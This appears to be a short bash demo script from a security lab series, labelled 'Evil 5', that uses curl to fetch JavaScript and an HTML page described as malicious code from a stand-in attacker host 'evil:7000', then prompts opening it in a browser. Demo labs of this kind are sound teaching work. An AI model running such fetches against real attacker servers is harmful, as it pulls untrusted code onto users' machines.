#!/bin/bash
echo "Evil 5: Send request to fetch malicious code with demo data to Evil Server"

# Note: we expect evil, spy and nice can be resolved locally
#       i.e. you added lines like this WITH YOUR IPs(!) to /etc/hosts
#       10.77.23.217  nice
#       10.77.23.216  evil 
#       10.77.23.215  spy

echo -n " * Get JS-code: "
curl 'http://evil:7000/index.js'

echo -n " * Get a html page: "
curl 'http://evil:7000/index.html'

echo " * Try to open http://evil:7000/ in the browser..."

# on Mac
# open "http://evil:7000/"